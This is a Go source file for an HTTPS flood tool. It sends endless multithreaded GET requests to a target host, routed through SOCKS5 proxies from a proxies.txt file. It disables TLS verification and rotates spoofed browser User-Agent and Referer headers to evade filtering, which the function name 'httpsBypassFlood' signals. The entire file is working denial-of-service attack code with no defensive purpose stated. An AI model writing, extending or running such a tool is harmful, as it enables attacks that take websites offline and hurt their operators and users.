package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var (
	target   string
	port     int
	threads  int
	duration int
	proxies  []string
	wg       sync.WaitGroup
)

func loadProxies() error {
	file, err := os.Open("proxies.txt")
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	return scanner.Err()
}

func httpsBypassFlood(proxyAddr string, stop chan struct{}) {
	defer wg.Done()

	var transport *http.Transport
	if proxyAddr != "" {
		dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
		if err != nil {
			return
		}
		transport = &http.Transport{
			Dial:                dialer.Dial,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   true,
			TLSHandshakeTimeout: 3 * time.Second,
			MaxIdleConnsPerHost: -1,
		}
	} else {
		transport = &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   true,
			TLSHandshakeTimeout: 3 * time.Second,
			MaxIdleConnsPerHost: -1,
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   3 * time.Second,
	}

	targetURL := fmt.Sprintf("https://%s:%d", target, port)
	if port == 443 {
		targetURL = fmt.Sprintf("https://%s", target)
	}

	referers := []string{
		"https://www.google.com/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.amazon.com/",
		"https://www.reddit.com/",
	}

	for {
		select {
		case <-stop:
			return
		default:
			req, err := http.NewRequest("GET", targetURL, nil)
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			req.Header.Set("Referer", referers[rand.Intn(len(referers))])
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Pragma", "no-cache")

			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
			}
		}
	}
}

func main() {
	target = os.Getenv("target")
	port, _ = strconv.Atoi(os.Getenv("port"))
	threads, _ = strconv.Atoi(os.Getenv("threads"))
	duration, _ = strconv.Atoi(os.Getenv("duration"))

	if err := loadProxies(); err != nil || len(proxies) == 0 {
		proxies = []string{""}
	}

	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		proxyAddr := ""
		if len(proxies) > 0 {
			proxyAddr = proxies[rand.Intn(len(proxies))]
		}
		go httpsBypassFlood(proxyAddr, stop)
	}

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)
	wg.Wait()
}